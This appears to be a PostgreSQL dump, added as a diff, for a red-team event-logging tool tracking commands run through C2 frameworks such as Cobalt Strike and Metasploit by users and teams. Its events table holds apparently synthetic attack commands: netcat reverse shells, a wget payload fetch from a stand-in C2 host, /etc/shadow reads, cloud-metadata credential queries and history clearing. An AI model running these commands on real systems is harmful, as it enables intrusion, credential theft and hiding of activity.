@@ -1,0 +1,1759 @@
+--
+-- PostgreSQL database dump
+--
+
+\restrict DTgP19zeYFkLWFoh9HxtXPojt8OEMaeeJdf4APrawLovw3Me9Ho9TLcZty6csXN
+
+-- Dumped from database version 18.3 (Debian 18.3-1.pgdg13+1)
+-- Dumped by pg_dump version 18.3
+
+SET statement_timeout = 0;
+SET lock_timeout = 0;
+SET idle_in_transaction_session_timeout = 0;
+SET transaction_timeout = 0;
+SET client_encoding = 'UTF8';
+SET standard_conforming_strings = on;
+SELECT pg_catalog.set_config('search_path', '', false);
+SET check_function_bodies = false;
+SET xmloption = content;
+SET client_min_messages = warning;
+SET row_security = off;
+
+--
+-- Name: lober; Type: SCHEMA; Schema: -; Owner: lober
+--
+
+CREATE SCHEMA lober;
+
+
+ALTER SCHEMA lober OWNER TO lober;
+
+SET default_tablespace = '';
+
+SET default_table_access_method = heap;
+
+--
+-- Name: c2s; Type: TABLE; Schema: lober; Owner: lober
+--
+
+CREATE TABLE lober.c2s (
+    id integer NOT NULL,
+    name character varying(32) NOT NULL
+);
+
+
+ALTER TABLE lober.c2s OWNER TO lober;
+
+--
+-- Name: c2s_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.c2s_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.c2s_id_seq OWNER TO lober;
+
+--
+-- Name: c2s_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.c2s_id_seq OWNED BY lober.c2s.id;
+
+
+--
+-- Name: events; Type: TABLE; Schema: lober; Owner: lober
+--
+
+CREATE TABLE lober.events (
+    id integer NOT NULL,
+    command text NOT NULL,
+    user_id integer NOT NULL,
+    c2_id integer NOT NULL,
+    scope_id integer NOT NULL,
+    "time" timestamp without time zone DEFAULT CURRENT_TIMESTAMP NOT NULL
+);
+
+
+ALTER TABLE lober.events OWNER TO lober;
+
+--
+-- Name: events_c2_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.events_c2_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.events_c2_id_seq OWNER TO lober;
+
+--
+-- Name: events_c2_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.events_c2_id_seq OWNED BY lober.events.c2_id;
+
+
+--
+-- Name: events_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.events_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.events_id_seq OWNER TO lober;
+
+--
+-- Name: events_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.events_id_seq OWNED BY lober.events.id;
+
+
+--
+-- Name: events_scope_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.events_scope_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.events_scope_id_seq OWNER TO lober;
+
+--
+-- Name: events_scope_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.events_scope_id_seq OWNED BY lober.events.scope_id;
+
+
+--
+-- Name: events_user_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.events_user_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.events_user_id_seq OWNER TO lober;
+
+--
+-- Name: events_user_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.events_user_id_seq OWNED BY lober.events.user_id;
+
+
+--
+-- Name: scope; Type: TABLE; Schema: lober; Owner: lober
+--
+
+CREATE TABLE lober.scope (
+    id integer NOT NULL,
+    name character varying(32) NOT NULL
+);
+
+
+ALTER TABLE lober.scope OWNER TO lober;
+
+--
+-- Name: scope_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.scope_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.scope_id_seq OWNER TO lober;
+
+--
+-- Name: scope_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.scope_id_seq OWNED BY lober.scope.id;
+
+
+--
+-- Name: teams; Type: TABLE; Schema: lober; Owner: lober
+--
+
+CREATE TABLE lober.teams (
+    id integer NOT NULL,
+    name character varying(32) NOT NULL,
+    color character varying(6) DEFAULT '000000'::character varying NOT NULL
+);
+
+
+ALTER TABLE lober.teams OWNER TO lober;
+
+--
+-- Name: teams_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.teams_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.teams_id_seq OWNER TO lober;
+
+--
+-- Name: teams_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.teams_id_seq OWNED BY lober.teams.id;
+
+
+--
+-- Name: tokens; Type: TABLE; Schema: lober; Owner: lober
+--
+
+CREATE TABLE lober.tokens (
+    id integer NOT NULL,
+    token character varying NOT NULL,
+    user_id integer NOT NULL,
+    c2_id integer NOT NULL,
+    created timestamp without time zone DEFAULT CURRENT_TIMESTAMP NOT NULL,
+    expires timestamp without time zone NOT NULL
+);
+
+
+ALTER TABLE lober.tokens OWNER TO lober;
+
+--
+-- Name: tokens_c2_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.tokens_c2_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.tokens_c2_id_seq OWNER TO lober;
+
+--
+-- Name: tokens_c2_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.tokens_c2_id_seq OWNED BY lober.tokens.c2_id;
+
+
+--
+-- Name: tokens_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.tokens_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.tokens_id_seq OWNER TO lober;
+
+--
+-- Name: tokens_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.tokens_id_seq OWNED BY lober.tokens.id;
+
+
+--
+-- Name: tokens_user_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.tokens_user_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.tokens_user_id_seq OWNER TO lober;
+
+--
+-- Name: tokens_user_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.tokens_user_id_seq OWNED BY lober.tokens.user_id;
+
+
+--
+-- Name: users; Type: TABLE; Schema: lober; Owner: lober
+--
+
+CREATE TABLE lober.users (
+    id integer NOT NULL,
+    username character varying(32) NOT NULL,
+    password character varying(64) NOT NULL,
+    team_id integer NOT NULL
+);
+
+
+ALTER TABLE lober.users OWNER TO lober;
+
+--
+-- Name: users_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.users_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.users_id_seq OWNER TO lober;
+
+--
+-- Name: users_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.users_id_seq OWNED BY lober.users.id;
+
+
+--
+-- Name: users_team_id_seq; Type: SEQUENCE; Schema: lober; Owner: lober
+--
+
+CREATE SEQUENCE lober.users_team_id_seq
+    AS integer
+    START WITH 1
+    INCREMENT BY 1
+    NO MINVALUE
+    NO MAXVALUE
+    CACHE 1;
+
+
+ALTER SEQUENCE lober.users_team_id_seq OWNER TO lober;
+
+--
+-- Name: users_team_id_seq; Type: SEQUENCE OWNED BY; Schema: lober; Owner: lober
+--
+
+ALTER SEQUENCE lober.users_team_id_seq OWNED BY lober.users.team_id;
+
+
+--
+-- Name: c2s id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.c2s ALTER COLUMN id SET DEFAULT nextval('lober.c2s_id_seq'::regclass);
+
+
+--
+-- Name: events id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.events ALTER COLUMN id SET DEFAULT nextval('lober.events_id_seq'::regclass);
+
+
+--
+-- Name: events user_id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.events ALTER COLUMN user_id SET DEFAULT nextval('lober.events_user_id_seq'::regclass);
+
+
+--
+-- Name: events c2_id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.events ALTER COLUMN c2_id SET DEFAULT nextval('lober.events_c2_id_seq'::regclass);
+
+
+--
+-- Name: events scope_id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.events ALTER COLUMN scope_id SET DEFAULT nextval('lober.events_scope_id_seq'::regclass);
+
+
+--
+-- Name: scope id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.scope ALTER COLUMN id SET DEFAULT nextval('lober.scope_id_seq'::regclass);
+
+
+--
+-- Name: teams id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.teams ALTER COLUMN id SET DEFAULT nextval('lober.teams_id_seq'::regclass);
+
+
+--
+-- Name: tokens id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.tokens ALTER COLUMN id SET DEFAULT nextval('lober.tokens_id_seq'::regclass);
+
+
+--
+-- Name: tokens user_id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.tokens ALTER COLUMN user_id SET DEFAULT nextval('lober.tokens_user_id_seq'::regclass);
+
+
+--
+-- Name: tokens c2_id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.tokens ALTER COLUMN c2_id SET DEFAULT nextval('lober.tokens_c2_id_seq'::regclass);
+
+
+--
+-- Name: users id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.users ALTER COLUMN id SET DEFAULT nextval('lober.users_id_seq'::regclass);
+
+
+--
+-- Name: users team_id; Type: DEFAULT; Schema: lober; Owner: lober
+--
+
+ALTER TABLE ONLY lober.users ALTER COLUMN team_id SET DEFAULT nextval('lober.users_team_id_seq'::regclass);
+
+
+--
+-- Data for Name: c2s; Type: TABLE DATA; Schema: lober; Owner: lober
+--
+
+COPY lober.c2s (id, name) FROM stdin;
+1	msf
+2	realm
+3	cobaltstrike
+4	skeletor
+\.
+
+
+--
+-- Data for Name: events; Type: TABLE DATA; Schema: lober; Owner: lober
+--
+
+COPY lober.events (id, command, user_id, c2_id, scope_id, "time") FROM stdin;
+1	three four five	2	1	1	2026-03-31 17:06:43.119828
+2	ps -ef --forest --tag=318	3	1	2	2026-03-30 21:43:26.772164
+3	cat /etc/shadow --tag=709	5	3	3	2026-03-31 15:34:27.232833
+4	ps -ef --forest --tag=24	6	4	3	2026-03-30 22:02:33.588572
+5	crontab -l --tag=10	5	1	2	2026-03-30 21:52:33.690916
+6	find / -perm -4000 -type f 2>/dev/null --tag=359	6	1	1	2026-03-31 16:18:13.675626
+7	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=134	4	1	3	2026-03-30 22:46:43.251431
+8	export HISTCONTROL=ignoredups --tag=156	2	4	2	2026-03-30 19:12:43.946223
+9	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=113	5	1	5	2026-03-30 18:52:18.758287
+10	ls -laR /home/ --tag=806	6	1	4	2026-03-31 09:22:44.142869
+11	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=72	2	2	4	2026-03-31 02:21:50.448631
+12	kubectl get pods --all-namespaces --tag=697	6	4	2	2026-03-31 06:05:15.157866
+13	nc -e /bin/sh 10.0.0.78 4444 --tag=233	6	3	1	2026-03-31 05:09:17.475153
+14	grep -r "password" /var/www/html/ --tag=653	5	1	1	2026-03-30 23:25:56.316124
+15	export HISTCONTROL=ignoredups --tag=382	1	3	5	2026-03-31 02:23:17.74833
+16	grep -r "password" /var/www/html/ --tag=132	2	3	3	2026-03-30 18:36:38.223296
+17	find / -perm -4000 -type f 2>/dev/null --tag=130	3	4	1	2026-03-31 10:21:54.236659
+18	cat /etc/shadow --tag=106	3	2	4	2026-03-30 21:59:06.202405
+19	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=569	6	1	4	2026-03-31 02:15:17.128121
+20	base64 /etc/passwd | head -n 5 --tag=161	5	1	2	2026-03-31 12:00:30.327494
+21	crontab -l --tag=350	2	1	5	2026-03-30 22:50:21.730642
+22	netstat -antp --tag=260	5	4	1	2026-03-31 08:45:48.026637
+23	tcpdump -i eth0 -c 10 --tag=318	6	1	5	2026-03-31 05:50:38.381941
+24	find / -perm -4000 -type f 2>/dev/null --tag=107	2	4	3	2026-03-31 02:00:58.226017
+25	docker images --tag=656	6	2	3	2026-03-30 20:51:00.088105
+26	cat /etc/shadow --tag=969	2	1	5	2026-03-30 17:25:50.040384
+27	base64 /etc/passwd | head -n 5 --tag=749	1	4	3	2026-03-30 23:24:35.446445
+28	export HISTCONTROL=ignoredups --tag=955	3	3	4	2026-03-31 11:39:56.24272
+29	nc -e /bin/sh 10.0.0.54 4444 --tag=572	6	4	3	2026-03-31 15:27:20.861901
+30	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=807	3	3	3	2026-03-31 07:07:24.821765
+31	base64 /etc/passwd | head -n 5 --tag=398	4	3	2	2026-03-31 03:58:54.23687
+32	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=822	6	1	2	2026-03-31 02:39:59.390992
+33	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=902	2	3	3	2026-03-31 17:11:20.375289
+34	crontab -l --tag=415	2	1	3	2026-03-31 05:54:00.602205
+35	kubectl get pods --all-namespaces --tag=191	3	4	2	2026-03-30 20:29:18.175799
+36	docker images --tag=839	4	2	3	2026-03-31 05:04:33.04075
+37	docker images --tag=643	6	1	4	2026-03-30 22:24:45.457581
+38	export HISTCONTROL=ignoredups --tag=618	6	2	2	2026-03-31 07:41:14.052871
+39	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=916	5	1	2	2026-03-30 22:35:34.265146
+40	cat /etc/shadow --tag=843	4	3	5	2026-03-31 00:57:32.532657
+41	docker images --tag=729	2	1	1	2026-03-30 17:53:19.533729
+42	export HISTCONTROL=ignoredups --tag=719	5	3	1	2026-03-30 20:06:13.350729
+43	grep -r "password" /var/www/html/ --tag=698	1	1	2	2026-03-30 20:48:53.361434
+44	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=913	6	3	3	2026-03-31 10:38:48.384874
+45	netstat -antp --tag=520	3	1	3	2026-03-31 10:16:14.054453
+46	grep -r "password" /var/www/html/ --tag=903	4	4	2	2026-03-30 20:30:09.256011
+47	netstat -antp --tag=616	6	1	4	2026-03-30 21:55:19.448135
+48	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=272	1	1	4	2026-03-31 15:43:42.565219
+49	find / -perm -4000 -type f 2>/dev/null --tag=128	2	3	3	2026-03-30 18:29:10.904911
+50	find / -perm -4000 -type f 2>/dev/null --tag=272	5	2	5	2026-03-30 23:10:30.692779
+51	history -c --tag=705	1	1	1	2026-03-31 11:55:55.658068
+52	sudo -l --tag=579	4	1	2	2026-03-30 23:23:08.208131
+53	ps -ef --forest --tag=195	3	2	5	2026-03-31 10:49:16.353125
+54	export HISTCONTROL=ignoredups --tag=504	6	1	2	2026-03-31 01:08:43.851434
+55	history -c --tag=893	5	3	3	2026-03-31 14:49:44.934614
+56	history -c --tag=826	6	2	1	2026-03-30 19:31:35.032249
+57	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=216	4	2	4	2026-03-30 22:00:53.703407
+58	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=143	6	3	4	2026-03-31 14:58:32.254612
+59	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=472	6	4	5	2026-03-30 20:48:05.745393
+60	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=874	3	1	3	2026-03-31 16:47:37.831694
+61	cat /etc/shadow --tag=712	1	2	4	2026-03-31 17:03:16.135176
+62	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=73	3	3	5	2026-03-30 21:44:09.430228
+63	ls -laR /home/ --tag=253	5	1	3	2026-03-31 15:28:21.56502
+64	history -c --tag=263	4	1	5	2026-03-30 19:20:51.885065
+65	kubectl get pods --all-namespaces --tag=683	1	2	3	2026-03-30 23:47:24.587837
+66	docker images --tag=659	6	1	4	2026-03-31 14:29:24.658474
+67	docker images --tag=625	4	4	1	2026-03-31 09:45:58.776054
+68	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=647	6	2	2	2026-03-30 23:00:08.827845
+69	ls -laR /home/ --tag=482	5	3	3	2026-03-31 17:11:26.450485
+70	tcpdump -i eth0 -c 10 --tag=981	1	3	3	2026-03-30 19:53:05.264253
+71	netstat -antp --tag=239	2	3	4	2026-03-31 02:11:35.235953
+72	ls -laR /home/ --tag=450	3	4	1	2026-03-31 14:04:48.095027
+73	crontab -l --tag=223	6	4	2	2026-03-30 21:12:17.55327
+74	ps -ef --forest --tag=108	1	3	2	2026-03-31 08:46:13.840738
+75	ps -ef --forest --tag=62	5	2	5	2026-03-31 07:15:39.328849
+76	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=359	1	4	3	2026-03-30 17:46:41.163751
+77	history -c --tag=251	4	2	2	2026-03-31 10:52:51.232174
+78	docker images --tag=480	5	1	1	2026-03-31 03:07:38.573975
+79	ps -ef --forest --tag=217	5	4	3	2026-03-30 23:37:35.168047
+80	docker images --tag=175	6	1	2	2026-03-31 14:58:20.473377
+81	whoami /all --tag=823	4	3	1	2026-03-31 14:43:20.905261
+82	whoami /all --tag=716	6	2	4	2026-03-30 21:20:50.908434
+83	kubectl get pods --all-namespaces --tag=546	5	4	2	2026-03-30 19:22:18.390097
+84	export HISTCONTROL=ignoredups --tag=6	2	2	5	2026-03-31 00:19:29.969332
+85	ls -laR /home/ --tag=245	3	2	3	2026-03-31 11:11:05.63664
+86	kubectl get pods --all-namespaces --tag=867	3	2	4	2026-03-31 00:07:36.957932
+87	ps -ef --forest --tag=5	6	1	1	2026-03-31 12:00:58.659754
+88	ps -ef --forest --tag=652	6	1	2	2026-03-30 21:39:39.577318
+89	base64 /etc/passwd | head -n 5 --tag=277	6	1	5	2026-03-31 01:57:03.777279
+90	sudo -l --tag=24	2	4	5	2026-03-30 18:20:08.326475
+91	netstat -antp --tag=750	2	1	3	2026-03-31 13:40:15.240483
+92	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=258	6	4	5	2026-03-31 00:26:12.91073
+93	export HISTCONTROL=ignoredups --tag=152	5	4	5	2026-03-31 09:00:47.661702
+94	netstat -antp --tag=138	4	2	4	2026-03-31 11:41:41.147224
+95	nc -e /bin/sh 10.0.0.15 4444 --tag=321	4	3	2	2026-03-31 15:04:47.237531
+96	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=36	1	4	3	2026-03-31 06:17:48.229459
+97	base64 /etc/passwd | head -n 5 --tag=638	4	2	3	2026-03-31 08:13:28.165286
+98	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=641	1	1	3	2026-03-31 13:12:09.08964
+99	docker images --tag=768	6	1	1	2026-03-30 23:27:39.221631
+100	ls -laR /home/ --tag=362	3	4	1	2026-03-30 23:07:13.40512
+101	find / -perm -4000 -type f 2>/dev/null --tag=622	1	2	1	2026-03-31 13:36:54.534406
+102	nc -e /bin/sh 10.0.0.32 4444 --tag=862	4	3	1	2026-03-30 23:25:06.966527
+103	sudo -l --tag=313	4	1	4	2026-03-31 07:24:31.429394
+104	crontab -l --tag=753	4	2	1	2026-03-30 21:29:10.014037
+105	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=2	2	1	1	2026-03-31 09:26:52.575887
+106	export HISTCONTROL=ignoredups --tag=426	5	1	4	2026-03-31 13:34:22.038766
+107	nc -e /bin/sh 10.0.0.209 4444 --tag=509	3	3	3	2026-03-31 12:15:41.984527
+108	whoami /all --tag=876	3	1	2	2026-03-31 05:00:31.660826
+109	history -c --tag=457	3	2	3	2026-03-31 16:31:26.352665
+110	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=345	6	4	2	2026-03-31 02:29:05.455185
+111	base64 /etc/passwd | head -n 5 --tag=725	6	4	3	2026-03-31 09:15:06.874727
+112	find / -perm -4000 -type f 2>/dev/null --tag=14	3	3	5	2026-03-31 09:47:53.453669
+113	whoami /all --tag=862	4	3	3	2026-03-30 23:29:37.736956
+114	nc -e /bin/sh 10.0.0.155 4444 --tag=546	5	4	5	2026-03-30 21:41:47.958107
+115	grep -r "password" /var/www/html/ --tag=16	4	3	3	2026-03-30 23:19:33.784986
+116	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=602	3	1	1	2026-03-31 05:00:45.224963
+117	ls -laR /home/ --tag=44	1	3	5	2026-03-30 19:46:05.750683
+118	crontab -l --tag=24	2	2	1	2026-03-31 10:16:50.241005
+119	ps -ef --forest --tag=652	5	2	4	2026-03-31 12:41:21.96579
+120	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=683	6	2	1	2026-03-31 13:12:09.956345
+121	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=419	5	1	3	2026-03-31 02:43:42.453083
+122	grep -r "password" /var/www/html/ --tag=760	4	3	2	2026-03-31 15:24:25.4744
+123	nc -e /bin/sh 10.0.0.223 4444 --tag=577	2	4	4	2026-03-31 00:34:01.416809
+124	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=780	2	3	1	2026-03-31 06:18:04.944374
+125	cat /etc/shadow --tag=189	4	4	4	2026-03-31 09:07:15.144795
+126	find / -perm -4000 -type f 2>/dev/null --tag=404	3	1	5	2026-03-30 20:51:56.70189
+127	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=500	2	4	2	2026-03-31 15:35:02.296345
+128	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=768	1	2	3	2026-03-31 09:49:14.074147
+129	nc -e /bin/sh 10.0.0.64 4444 --tag=760	2	3	5	2026-03-30 23:59:45.702493
+130	crontab -l --tag=855	1	2	3	2026-03-30 20:02:01.236007
+131	sudo -l --tag=296	6	3	5	2026-03-31 06:55:16.118921
+132	crontab -l --tag=672	6	3	3	2026-03-31 14:27:05.766592
+133	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=501	1	1	1	2026-03-31 16:52:21.310462
+134	crontab -l --tag=27	4	1	4	2026-03-31 08:19:25.587823
+135	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=165	6	3	2	2026-03-30 22:54:45.954424
+136	crontab -l --tag=66	1	2	2	2026-03-31 06:08:12.588038
+137	kubectl get pods --all-namespaces --tag=638	3	1	4	2026-03-30 20:47:43.340365
+138	grep -r "password" /var/www/html/ --tag=304	5	2	5	2026-03-31 10:25:48.043455
+139	nc -e /bin/sh 10.0.0.15 4444 --tag=150	4	3	2	2026-03-31 11:25:19.486982
+140	tcpdump -i eth0 -c 10 --tag=78	3	1	1	2026-03-30 19:24:09.604238
+141	crontab -l --tag=496	4	4	1	2026-03-30 19:39:36.561593
+142	ls -laR /home/ --tag=54	2	1	2	2026-03-31 09:14:18.929262
+143	ps -ef --forest --tag=486	1	4	5	2026-03-31 02:07:21.642746
+144	netstat -antp --tag=753	3	4	5	2026-03-31 13:10:17.183526
+145	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=647	4	3	1	2026-03-31 08:02:44.007942
+146	history -c --tag=424	4	4	5	2026-03-31 03:08:45.839349
+147	export HISTCONTROL=ignoredups --tag=981	1	1	1	2026-03-30 22:38:13.130234
+148	base64 /etc/passwd | head -n 5 --tag=106	6	4	1	2026-03-31 17:18:46.979798
+149	nc -e /bin/sh 10.0.0.224 4444 --tag=412	3	2	2	2026-03-30 23:36:49.77983
+150	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=128	6	2	4	2026-03-31 13:24:48.705107
+151	export HISTCONTROL=ignoredups --tag=378	1	2	1	2026-03-30 19:17:16.016383
+152	netstat -antp --tag=121	5	3	1	2026-03-31 01:05:35.671294
+153	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=98	6	4	1	2026-03-31 05:35:14.781847
+154	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=721	1	1	5	2026-03-31 07:58:50.279594
+155	sudo -l --tag=568	2	3	4	2026-03-30 19:23:18.924092
+156	ls -laR /home/ --tag=664	6	4	1	2026-03-30 22:36:45.570379
+157	nc -e /bin/sh 10.0.0.66 4444 --tag=14	2	2	5	2026-03-31 01:44:21.950138
+158	ps -ef --forest --tag=187	4	1	5	2026-03-31 11:32:25.674095
+159	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=572	1	3	2	2026-03-30 22:30:12.419033
+160	ps -ef --forest --tag=377	3	3	3	2026-03-31 12:19:42.812295
+161	docker images --tag=483	3	3	1	2026-03-31 09:25:42.443537
+162	sudo -l --tag=604	2	2	2	2026-03-30 17:48:26.92049
+163	sudo -l --tag=217	6	3	2	2026-03-31 09:00:21.139588
+164	find / -perm -4000 -type f 2>/dev/null --tag=43	4	2	4	2026-03-31 12:28:41.141765
+165	sudo -l --tag=827	3	3	2	2026-03-31 06:30:24.777282
+166	cat /etc/shadow --tag=82	3	3	5	2026-03-31 06:37:54.045008
+167	history -c --tag=601	1	1	1	2026-03-31 16:13:14.104053
+168	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=777	2	1	5	2026-03-31 07:48:44.509784
+169	cat /etc/shadow --tag=62	5	3	1	2026-03-31 04:24:24.266611
+170	export HISTCONTROL=ignoredups --tag=57	2	4	3	2026-03-31 13:57:50.460053
+171	sudo -l --tag=169	2	2	3	2026-03-30 17:29:34.05452
+172	docker images --tag=680	3	3	3	2026-03-31 11:36:34.505282
+173	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=588	5	3	5	2026-03-30 23:34:39.631596
+174	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=916	4	4	3	2026-03-31 04:30:12.371205
+175	ls -laR /home/ --tag=263	5	4	3	2026-03-31 06:12:14.747094
+176	kubectl get pods --all-namespaces --tag=2	3	1	1	2026-03-31 09:02:22.615716
+177	sudo -l --tag=79	5	3	2	2026-03-30 19:29:21.700339
+178	crontab -l --tag=262	2	3	5	2026-03-31 11:17:28.530578
+179	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=471	2	1	2	2026-03-31 10:22:06.180217
+180	grep -r "password" /var/www/html/ --tag=132	5	2	5	2026-03-31 12:38:55.656252
+181	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=40	3	4	2	2026-03-31 16:09:52.686121
+182	grep -r "password" /var/www/html/ --tag=508	5	4	5	2026-03-31 00:41:26.869877
+183	find / -perm -4000 -type f 2>/dev/null --tag=464	6	4	3	2026-03-31 00:20:22.630659
+184	netstat -antp --tag=623	6	4	1	2026-03-31 13:06:53.284611
+185	cat /etc/shadow --tag=855	5	1	2	2026-03-30 23:09:06.269044
+186	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=657	6	1	3	2026-03-31 16:29:13.050416
+187	ls -laR /home/ --tag=269	2	3	5	2026-03-31 06:55:10.603227
+188	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=954	1	3	3	2026-03-30 18:22:40.891769
+189	grep -r "password" /var/www/html/ --tag=990	3	2	2	2026-03-31 04:10:15.399661
+190	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=810	5	4	1	2026-03-31 10:33:15.517095
+191	ps -ef --forest --tag=874	4	2	2	2026-03-31 02:24:08.318339
+192	grep -r "password" /var/www/html/ --tag=53	6	1	2	2026-03-31 15:27:57.270137
